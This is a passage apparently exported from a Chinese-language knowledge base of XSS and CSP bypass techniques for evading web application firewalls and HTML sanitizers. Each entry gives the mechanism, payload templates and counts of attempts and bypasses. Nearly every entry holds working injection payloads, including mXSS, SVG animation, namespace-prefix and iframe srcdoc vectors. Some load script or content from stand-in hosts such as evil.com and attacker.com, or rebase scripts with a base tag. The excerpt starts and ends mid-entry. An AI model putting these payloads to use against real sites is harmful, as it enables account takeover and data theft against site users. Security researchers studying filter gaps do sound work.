- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T15:40:02.567190+00:00；retired=-

### `xss:context:dom_sink` — DOM 型

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：数据进 `innerHTML`/`eval`/`document.write`/`location` 等 sink；WAF 只查传输层，DOM 拼接在客户端完成。
- **模板**：`#<img src=x onerror=alert(1)>`、`javascript:alert(1)//#`
- **来源备注**：`#<img src=x onerror=alert(1)>`、`javascript:alert(1)//#`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T15:40:02.548712+00:00；retired=-

### `xss:context:double_angle_tag` — 双尖括号 <<script> 的解析器容错

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`<<script>` 是合法错误标记：浏览器容错规则把第一个 `<` 当文本、第二个 `<` 起正常解析出 `<script>`；正则 WAF 匹配到 `<<script>` 会误判命中/删除，剩余部分仍被浏览器解析执行。绕的是"匹配 <<script> 即拦截"的误判。
- **模板**：`<<script>alert(1)</script>`、`<<script>script>alert(1)</script>`
- **来源备注**：`<<script>alert(1)</script>`、`<<script>script>alert(1)</script>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T15:40:02.983962+00:00；retired=-

### `xss:context:embed_object` — embed/object 数据容器

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`<embed src>` / `<object data>` 接受 data: 协议文档，无需 on* 事件；WAF 若只拦 iframe/img 则漏。
- **模板**：`<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`、`<embed src=javascript:alert(1)>`（Firefox）`、`<embed/src=//evil.com/x.svg>`、`<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`、`<object data=javascript:alert(1)>`
- **来源备注**：`<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`、`<embed src=javascript:alert(1)>`（Firefox）`、`<embed/src=//evil.com/x.svg>`、`<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`、`<object data=javascript:alert(1)>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T15:40:03.003397+00:00；retired=-

### `xss:context:event_more` — 冷门事件处理器

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：onpointerenter/onauxclick/onmouseenter/ontouchstart/onclick/onmouseover 等冷门事件，WAF 黑名单常不全。
- **模板**：`<img src=x onpointerenter=alert(1)>`、`<img src=x onauxclick=alert(1)>`、`<body onscroll=alert(1)>`、`<a onauxclick=alert(1)>`
- **来源备注**：`<img src=x onpointerenter=alert(1)>`、`<img src=x onauxclick=alert(1)>`、`<body onscroll=alert(1)>`、`<a onauxclick=alert(1)>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-24T01:01:58.187251+00:00；retired=-

### `xss:context:form_vectors` — 表单 action 协议向量

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：事件处理器被滤时，`<form action>` / `<button formaction>` / `<isindex action>` 直接执行 `javascript:` URL，无需 on* 属性。
- **模板**：`<form action=javascript:alert(1)><input type=submit>`、`<form><button formaction=javascript:alert(1)>click`、`<form><isindex formaction="javascript:confirm(1)">`、`<isindex action=javascript:alert(1) type=image>`、`<isindex x="javascript:" onmouseover="alert(1)">`
- **来源备注**：`<form action=javascript:alert(1)><input type=submit>`、`<form><button formaction=javascript:alert(1)>click`、`<form><isindex formaction="javascript:confirm(1)">`、`<isindex action=javascript:alert(1) type=image>`、`<isindex x="javascript:" onmouseover="alert(1)">`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-24T01:01:58.251272+00:00；retired=-

### `xss:context:framework_sandbox` — 前端框架 sandbox escape

- **状态**：promoted
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：AngularJS ng-app/ng-csp 表达式注入、Vue 模板注入、React dangerouslySetInnerHTML 等框架上下文执行 JS，绕过只识别原生 script/事件的 WAF（社区 2024-2025 高频）
- **模板**：`<div ng-app ng-csp>{{$eval('alert(1)')}}</div>`、`<img src=x :onerror=alert(1)>`
- **来源备注**：`<div ng-app ng-csp>{{$eval('alert(1)')}}</div>`、`<img src=x :onerror=alert(1)>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=1；bypass=1；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-24T01:02:29.286365+00:00；retired=-

### `xss:context:framework_sink` — 前端框架 sink 注入

- **状态**：promoted
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：Vue v-html/动态属性绑定、React dangerouslySetInnerHTML、Svelte {@html}、Angular $sce 误用——框架把属性值当代码渲染，WAF 只认原生 script/事件会漏过框架指令形态
- **模板**：`<div v-html="alert(1)"></div>`、`{{constructor.constructor('alert(1)')()}}`
- **来源备注**：`<div v-html="alert(1)"></div>`、`{{constructor.constructor('alert(1)')()}}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=1；bypass=1；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-24T01:02:16.244502+00:00；retired=-

### `xss:context:import_map` — importmap/动态 import

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`<script type=importmap>` 声明 data: 模块映射，`<script type=module>import "x"</script>` 加载执行；或动态 `import('data:text/javascript,alert(1)')` 走 ESM 绕过静态规则。
- **模板**：`<script type="importmap">{"imports":{"x":"data:text/javascript,alert(1)"}}</script><script type="module">import "x"</script>`、`<script>import('data:text/javascript,alert(1)')</script>`、`<script>import(URL.createObjectURL(new Blob(['alert(1)'],{type:'text/javascript'})))</script>`
- **来源备注**：`<script type="importmap">{"imports":{"x":"data:text/javascript,alert(1)"}}</script><script type="module">import "x"</script>`、`<script>import('data:text/javascript,alert(1)')</script>`、`<script>import(URL.createObjectURL(new Blob(['alert(1)'],{type:'text/javascript'})))</script>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-24T01:01:58.908457+00:00；retired=-

### `xss:context:mathml_mxss` — MathML/SVG 命名空间混淆 mXSS [检索·Securitum/DOMPurify bypass 家族]

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`<math><mtext><table>` 嵌套利用 HTML 树构建器的命名空间切换—— sanitization 时与序列化重解析后节点所属命名空间不同（SVG/MathML foreign content），过滤器按 HTML 规则看是安全的，浏览器按 MathML 规则解析出可执行结构。
- **模板**：`<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>`、`<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`
- **来源备注**：`<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>`、`<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-24T01:04:51.983395+00:00；retired=-

### `xss:context:meta_refresh` — meta 刷新

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`<meta http-equiv=refresh content>` 的 content 值可执行 javascript:，绕过只在普通标签上下文检测的 WAF。
- **模板**：`<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`
- **来源备注**：`<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-24T01:04:51.930297+00:00；retired=-

### `xss:context:modern_event_denylist` — 新式事件属性穿透黑名单清洗器（onpointerrawupdate/onscrollend 等）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：2020s 新增事件（onpointerrawupdate、onscrollend、onpointerover、onauxclick、onbeforetoggle、onfocusin、onanimationstart、ontransitionend）普遍缺失于基于旧 w3schools 列表的清洗器黑名单，注入后原样保留并在指针移动/滚动/动画时触发。实证：CVE-2026-54070，Lute 引擎 allowAttr 黑名单缺失导致 SiYuan 存储型 XSS。绕的是"只封历史 on* 名单"的 CWE-184 不完整黑名单。
- **模板**：`<xss onpointerrawupdate=alert(1) style=display:block>XSS</xss>`、`<div onanimationstart=alert(1) style="animation-name:x;animation-duration:1s">`
- **来源备注**：`<xss onpointerrawupdate=alert(1) style=display:block>XSS</xss>`、`<div onanimationstart=alert(1) style="animation-name:x;animation-duration:1s">`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.986533+00:00；retired=-

### `xss:context:onbeforeinput_attr` — onbeforeinput 事件属性（contenteditable 触发）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：onbeforeinput 在元素值即将被修改前触发，要求宿主可编辑；该属性不在常见 WAF/清洗器事件黑名单里（黑名单多抄自旧版 w3schools 事件列表），PortSwigger cheat sheet 已收录 POC。绕的是基于属性名黑名单的 on* 检测。
- **模板**：`<xss contenteditable onbeforeinput=alert(1)>test`
- **来源备注**：`<xss contenteditable onbeforeinput=alert(1)>test`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.986533+00:00；retired=-

### `xss:context:popover_beforetoggle` — popover 属性与 onbeforetoggle 事件（隐藏元素内执行）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：Chrome HTML popover 新特性引入 onbeforetoggle/ontoggle 事件，配合 popovertarget 触发；且该事件在 `<input type=hidden>`、`<meta>` 等常规事件无法触发的元素上也可用，仅需一次点击。若页面已有合法 popovertarget 元素，注入的携带相同 id 的隐藏 input/meta 会先于原元素命中，点击合法按钮即执行攻击者代码。新事件名+新特性，多数按事件名黑名单或上下文判断的 WAF 未收录 onbeforetoggle。Gareth Heyes/PortSwigger 研究并加入 cheat sheet。
- **模板**：`<input type=hidden id=xss popover onbeforetoggle=alert(1)><button popovertarget=xss>Click</button>`
- **来源备注**：`<input type=hidden id=xss popover onbeforetoggle=alert(1)><button popovertarget=xss>Click</button>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.986533+00:00；retired=-

### `xss:context:postmessage_origin` — postMessage origin 前缀绕过

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：页面校验 message origin 用 includes/前缀匹配时，可用 attacker.com 前缀欺骗（如 target.com.attacker.com）注入跨域消息
- **模板**：`<script>parent.postMessage('x','*')</script>`
- **来源备注**：`<script>parent.postMessage('x','*')</script>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.986533+00:00；retired=-

### `xss:context:rawtext_escape` — 原始文本模式逃逸

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`<xmp>/<plaintext>/<listing>/<noembed>/<noframes>/<noscript>` 把内容当原始文本处理；注入闭合标签把解析器切回普通模式，再放可执行标签。WAF 只查 `<script`/`<img` 特征，不识这些"切模式"标签。
- **模板**：`<xmp><script>alert(1)</script></xmp>`、`<listing><script>alert(1)</script></listing>`、`<plaintext><script>alert(1)</script>`、`<noembed><p title="</noembed><img src=x onerror=alert(1)>">`、`<noframes><p title="</noframes><img src=x onerror=alert(1)>">`
- **来源备注**：`<xmp><script>alert(1)</script></xmp>`、`<listing><script>alert(1)</script></listing>`、`<plaintext><script>alert(1)</script>`、`<noembed><p title="</noembed><img src=x onerror=alert(1)>">`、`<noframes><p title="</noframes><img src=x onerror=alert(1)>">`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.986533+00:00；retired=-

### `xss:context:scrollsnapchanging` — 新型 scroll 事件

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`scrollsnapchanging` 是较新 scroll-snap 事件，规则集未收录——2024 实测绕过两层独立 XSS 过滤（gabriel.urdhr.fr），配合 atob 两阶段解码；用 fragment 锚点可自动触发，无需用户交互。
- **模板**：`<div style="...scroll-snap-type:y" data-x="innerHTML" data-y="<base64>" onscrollsnapchanging="this[this.dataset.x]=atob(this.dataset.y)">`
- **来源备注**：`<div style="...scroll-snap-type:y" data-x="innerHTML" data-y="<base64>" onscrollsnapchanging="this[this.dataset.x]=atob(this.dataset.y)">`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.986533+00:00；retired=-

### `xss:context:srcdoc` — iframe srcdoc 偷渡

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`<iframe srcdoc>` 把 HTML 字符串当文档注入子 frame，默认同源可访问 parent DOM；WAF 若只拦 src 不拦 srcdoc 则漏。子 frame 脚本执行不受父页面内联 CSP 拦截。
- **模板**：`<iframe srcdoc="<script>alert(1)</script>">`、`<iframe srcdoc="<script>parent.alert(1)</script>">`、`<iframe srcdoc=<svg/onload=alert(1)>>`
- **来源备注**：`<iframe srcdoc="<script>alert(1)</script>">`、`<iframe srcdoc="<script>parent.alert(1)</script>">`、`<iframe srcdoc=<svg/onload=alert(1)>>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.986533+00:00；retired=-

### `xss:context:srcset_multi_candidate` — srcset 多候选逗号分隔 + data:SVG 向量

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：srcset 值为逗号分隔的候选列表，须按候选逐一解析；对 srcset 做整串 scheme 校验或只看 src/href 的清洗器会漏掉内嵌候选；data:image/svg+xml 候选可携带带 onload 的 SVG（AngularJS ngSrcset/ngPropSrcset CVE-2024-8372 实证绕过域名限制）。绕的是"不按候选拆分解析 srcset"的检测。
- **模板**：`<img srcset="data:image/svg+xml,%3Csvg%20onload=alert(1)%3E">`、`<source srcset="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`
- **来源备注**：`<img srcset="data:image/svg+xml,%3Csvg%20onload=alert(1)%3E">`、`<source srcset="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.986533+00:00；retired=-

### `xss:context:svg_entity_decl` — SVG 内部实体声明注入 [战果·清洗]

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`<svg>` 内 `<!DOCTYPE svg [<!ENTITY x "...">]>` 声明内部实体，后续 `&x;` 展开——WAF 把 DOCTYPE/ENTITY 当 XML 声明忽略，浏览器 SVG 解析器会展开实体。零脚本 gadget 的姊妹向量（候选样本文本脏，机制有效）。
- **模板**：`<svg><!DOCTYPE svg [<!ENTITY x "<image href=x onerror=alert(1)>"]]>&x;</svg>`
- **来源备注**：`<svg><!DOCTYPE svg [<!ENTITY x "<image href=x onerror=alert(1)>"]]>&x;</svg>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.987536+00:00；retired=-

### `xss:context:svg_namespace_prefix` — 命名空间前缀标签名绕过元素块名单

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：XML/SVG 解析器把 `<x:script xmlns:x="http://www.w3.org/2000/svg">` 的标签名记录为完整限定名 `x:script` 而非 script。服务端清洗器按标签名做黑名单比较 tag=="script" 即失配放行；浏览器/XML 解析器把前缀解析到 SVG 命名空间后照常执行脚本。同样适用于 x:iframe、x:object、x:foreignObject。绕的是基于 tagName/localName 字符串匹配的标签块名单。GHSA-73g7-86qr-jrg3 实证。
- **模板**：`<x:script xmlns:x="http://www.w3.org/2000/svg">alert(1)</x:script>`
- **来源备注**：`<x:script xmlns:x="http://www.w3.org/2000/svg">alert(1)</x:script>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.987536+00:00；retired=-

### `xss:context:svg_smil_runtime` — SVG SMIL animate/set 运行时改写属性绕过静态清洗

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：SVG 动画元素 `<animate>`/`<set>`/`<animateTransform>`/`<animateMotion>` 可在渲染期动态改写父元素属性（attributeName + values/to/from），而静态清洗器/WAF 只检查属性键是否为 on* 前缀、href 或 xlink:href，看不到 attributeName/values 里携带的 javascript: 或 onmouseover。运行时才生成事件处理器或 javascript: href，绕过"解析时剥离危险属性"的静态黑名单与语义引擎。CVE-2026-31807（SiYuan）实证。
- **模板**：`<a><animate attributeName="href" values="javascript:alert(document.domain)" begin="0s" fill="freeze"/><text>Click me</text></a>`
- **来源备注**：`<a><animate attributeName="href" values="javascript:alert(document.domain)" begin="0s" fill="freeze"/><text>Click me</text></a>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.987536+00:00；retired=-

### `xss:context:svg_smil_urilist` — SMIL URI-list 语义绕过单值 scheme 校验

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：当 SVG `<animate>` 的 attributeName="href" 时，同元素 values 属性被赋予 SMIL URI-list 语义（分号分隔多个 URL，逐个生效）。清洗器若只按单个扁平 URL 校验 scheme，会把 `#safe;javascript:alert(1)` 判为合法（前导 `#safe` 片段通过）；实际渲染时浏览器依次尝试各 URL，最终落到 javascript:。绕的是对 URL 值只做单值 scheme 白名单校验的 sanitizer/WAF。sanitize-html GHSA-g8qq-57p8-ggw5 实证。
- **模板**：`<svg><a><animate attributeName="href" values="#safe;javascript:alert(1)" dur=".01s" fill="freeze"></animate><text>Click</text></a></svg>`
- **来源备注**：`<svg><a><animate attributeName="href" values="#safe;javascript:alert(1)" dur=".01s" fill="freeze"></animate><text>Click</text></a></svg>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.987536+00:00；retired=-

### `xss:context:svg_xhtml_namespace` — SVG/XHTML 命名空间脚本注入

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：XML/SVG 响应里用 XHTML 命名空间把 script 塞进去，WAF 按 HTML 标签名匹配会漏过带命名空间前缀的 script
- **模板**：`<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>`、`<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//attacker.com/1.js"/>`
- **来源备注**：`<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>`、`<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//attacker.com/1.js"/>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.987536+00:00；retired=-

### `xss:context:svg_xlink` — SVG xlink:href 协议

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：SVG `<a xlink:href=javascript:>` 触发，javascript: 不在 href 黑名单上下文。
- **模板**：`<svg><a xlink:href="javascript:alert(1)">x</a></svg>`、`<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=javascript:alert(1)>`
- **来源备注**：`<svg><a xlink:href="javascript:alert(1)">x</a></svg>`、`<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=javascript:alert(1)>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.987536+00:00；retired=-

### `xss:context:svg_xlink_data_script` — SVG xlink data 脚本

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`<svg><script xlink:href="data:text/javascript,alert(1)"></script></svg>` 用 xlink:href + data: URI 加载脚本——2024 真实绕过案例（客户端正则过滤），WAF 规则多只盯 `<script src=`.
- **模板**：`<svg><script xlink:href="data:text/javascript,alert(1)"></script></svg>`
- **来源备注**：`<svg><script xlink:href="data:text/javascript,alert(1)"></script></svg>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.987536+00:00；retired=-

### `xss:context:tag_bypass` — 标签逃逸

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：在标签间上下文注入新标签；用浏览器容错（省略引号/闭合、大小写、属性组合）避开 WAF 的 `<script` 特征。2024-2025 绕过主战场是"HTML5 自动触发事件 + 冷门标签"——WAF 黑名单漏了这些事件名。
- **模板**：`<img src=x onerror=alert(1)>`、`<svg/onload=alert(1)>`、`<img/src=x/onerror=alert(1)>`、`<details open ontoggle=alert(1)>`、`<details open onbeforetoggle=alert(1)>`
- **来源备注**：`<img src=x onerror=alert(1)>`、`<svg/onload=alert(1)>`、`<img/src=x/onerror=alert(1)>`、`<details open ontoggle=alert(1)>`、`<details open onbeforetoggle=alert(1)>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.987536+00:00；retired=-

### `xss:context:template_literal_js` — 模板字面量注入

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：JS 上下文中 `` `${alert(1)}` `` 模板字面量直接执行表达式——过滤 script/事件关键字时用反引号模板绕过。
- **模板**：`${alert(1)}``、``<img src=x onerror=alert(1)>`
- **来源备注**：`${alert(1)}``、``<img src=x onerror=alert(1)>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.987536+00:00；retired=-

### `xss:context:url_attr_whitelist_gap` — URL 承载属性白名单缺口（poster/action/data/cite）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：清洗器常只对 href/src/srcset 做 scheme 校验，漏掉同样承载 URL 的属性：video poster、form action、button formaction、object data、blockquote cite、SVG xlink:href——javascript: 就此存活（实证 Symfony HtmlSanitizer CVE-2026-48761/GHSA-hhg7-c65m-h7ff、SiYuan Lute GHSA-97xv-3v84-h358）。绕的是"只校验少数 URL 属性"的 CWE-184 不完整白名单。
- **模板**：`<form action=javascript:alert(1)><input type=submit>`、`<object data="javascript:alert(1)">`、`<video poster="javascript:alert(1)">`
- **来源备注**：`<form action=javascript:alert(1)><input type=submit>`、`<object data="javascript:alert(1)">`、`<video poster="javascript:alert(1)">`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.987536+00:00；retired=-

### `xss:context:url_proto` — URL 协议注入

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`javascript:` 伪协议进入 URL 上下文；用混淆绕过 `javascript:` 特征。scheme 内插空白/实体、协议相对 `//`、data:/vbscript:/blob: 等替代。浏览器对 URL scheme 大小写不敏感且容忍 scheme 内空白（现代修复已剥空白，需实测）。
- **模板**：`javascript:alert(1)`、`JaVaScRiPt:alert(1)`、`java\tscript:alert(1)`、`java\nscript:alert(1)`、`java%0ascript:alert(1)`
- **来源备注**：`javascript:alert(1)`、`JaVaScRiPt:alert(1)`、`java\tscript:alert(1)`、`java\nscript:alert(1)`、`java%0ascript:alert(1)`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:csp:nonce_base_inject` — base-uri 缺失 + base 标签泄漏 nonce 相对脚本

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：CSP 若只配 script-src 'nonce-...' 而缺 base-uri，注入 `<base href=https://attacker>` 可改变相对路径脚本的解析基准，让带合法 nonce 的 `<script src=/app.js>` 改从攻击者域名加载同一路径文件，等于把 nonce 复用到攻击者可控内容（swisskyrepo CSP Bypass 收录）。绕的是"有 nonce 却无 base-uri"的策略配置。
- **模板**：`<base href="//attacker.com/">`
- **来源备注**：`<base href="//attacker.com/">`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:csp:nonce_leak_gadget` — nonce 泄漏——受信脚本反射 nonce 后拼注入

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：若页面存在会把 nonce 值写进 DOM 的受信脚本（如带 nonce 的内联脚本把用户输入/location 反射），攻击者注入点一旦借该脚本把 nonce 拼进自己的 `<script nonce=...>`，即突破 nonce 方案（PortSwigger Academy CSP 主题收录）。绕的是"nonce 即安全"的假设——nonce 是可泄漏的数据。
- **模板**：`<script nonce=...>document.write(user_input)</script>` + 注入点触发反射后拼入新 script
- **来源备注**：`<script nonce=...>document.write(user_input)</script>` + 注入点触发反射后拼入新 script
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:csp:strict_dynamic_gadget` — strict-dynamic 下受信脚本 gadget 创建脚本

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：script-src 'strict-dynamic' 放开允许名单，仅信任由已受信脚本创建的动态脚本；若受信脚本存在可被攻击者数据驱动的 gadget（反射进 DOM、把外部数据当 src 创建 script、eval 类 sink），一次注入即可让 CSP 允许加载攻击者域脚本。绕的是"strict-dynamic 假设受信脚本可信"的前提。
- **模板**：`<script src=/trusted.js></script>` + 注入点利用 trusted.js 内可被驱动的 DOM/sink 反射
- **来源备注**：`<script src=/trusted.js></script>` + 注入点利用 trusted.js 内可被驱动的 DOM/sink 反射
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:csp:trusted_types_cross_doc` — Trusted Types/CSP 跨文档与 friendly frame 绕过

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
